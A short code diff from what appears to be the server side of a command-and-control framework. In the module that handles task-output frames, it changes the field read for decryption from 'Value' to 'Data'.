@@ -9,7 +9,7 @@ public class TaskOutputModule : ServerModule
     
     public override async Task ProcessFrame(C2Frame frame)
     {
-        var output = await Crypto.Decrypt<TaskOutput>(frame.Value);
+        var output = await Crypto.Decrypt<TaskOutput>(frame.Data);
         var record = await Tasks.Get(output.TaskId);
         
         if (record is null)
